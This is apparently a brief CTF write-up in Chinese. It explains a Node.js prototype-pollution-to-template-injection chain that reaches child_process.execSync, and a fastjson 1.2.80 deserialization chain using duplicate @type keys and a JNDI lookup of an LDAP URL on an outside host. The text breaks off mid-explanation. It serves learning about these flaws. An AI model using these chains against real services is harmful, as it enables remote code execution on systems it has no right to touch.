prototype-preview(原型链污染+js模板注入)

目录扫描发现/source

得到源码：

  1. deepMerge 没有过滤 __proto__。当 JSON 里传入 {"__proto__": {...}} 时，递归目标会落到 Object.prototype 上，造成原型链污染。
  2. renderTemplate 的 options = {} 是普通空对象，如果 Object.prototype.escapeFunction 被污染，options.escapeFunction 会读到继承属性。
  3. escapeFunction 被直接拼接进 new Function 的函数体：const escape = <escapeFunction>;，而且 require 被作为参数传入，所以可以调用 child_process.execSync。

fastjson反序列化

是fastjson 1.2.80

fastjson 1.2.80 可以用 Throwable 反序列化路径保留两个同名 @type，触发 com.test.demo.Lamp：

Fastjson在反序列化Exception类型时，会处理其@type字段，从而“二次解析”得到Lamp类

注意这里不能用普通 JSON 对象/dict 去序列化，因为同名 key 会被覆盖，必须发送 raw JSON 字符串。

当JNDI lookup("ldap://1.2.3.4:1389/Exploit") 时：

  1. 客户端（靶机）连接到LDAP服务器
  2. LDAP服务器返回一个包含特殊属性的条目
